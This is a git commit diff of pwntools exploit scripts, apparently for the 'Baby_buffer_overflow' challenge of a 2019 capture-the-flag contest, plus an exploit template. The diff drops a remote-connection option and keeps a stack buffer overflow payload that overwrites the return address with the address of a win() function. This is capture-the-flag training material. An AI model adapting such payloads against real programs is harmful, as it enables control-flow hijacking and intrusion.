f15cefbc12d91eac5b0c4199344d9f957a002c70
m412u <du8bry2kaq@gmail.com>
2020-01-02 10:29:42 +0900

    [edit] exp.py

--- 2019/kksctf_open_2019/Baby_buffer_overflow/exp.py
+++ 2019/kksctf_open_2019/Baby_buffer_overflow/exp.py
@@ -8,23 +8,18 @@ binfile = "./baby_bof"
 
 elf = ELF(binfile)
 
-if len(argv) >= 2 and argv[1] == "r":
-    p = remote("localhost", 9999)
-    #libc = ELF("./")
-elif len(argv) >= 2 and argv[1] == "d":
+if len(argv) >= 2 and argv[1] == "d":
     p = gdb.debug(binfile, '''
         break *0x08048638
         continue
     ''')
-    #libc = elf.libc
 else:
     p = process(binfile)
-    #libc = elf.libc
 
 payload = b""
 payload += b"A" * 260
 payload += p32(0x080485f6)    # win()
-payload += p32(0xBBBBBBBB)
+payload += p32(0xBBBBBBBB)    # padding
 payload += p32(0xcafebabe)
 
 p.recvuntil("Enter your name: ")
--- exp.py
+++ exp.py
@@ -8,18 +8,13 @@ binfile = "./binfile"
 
 elf = ELF(binfile)
 
-if len(argv) >= 2 and argv[1] == "r":
-    p = remote("localhost", 9999)
-    #libc = ELF("./")
-elif len(argv) >= 2 and argv[1] == "d":
+if len(argv) >= 2 and argv[1] == "d":
     p = gdb.debug(binfile, '''
         break *0x0
         continue
     ''')
-    #libc = elf.libc
 else:
     p = process(binfile)
-    #libc = elf.libc
 
 payload = b""
 payload += b"A" * 0x8
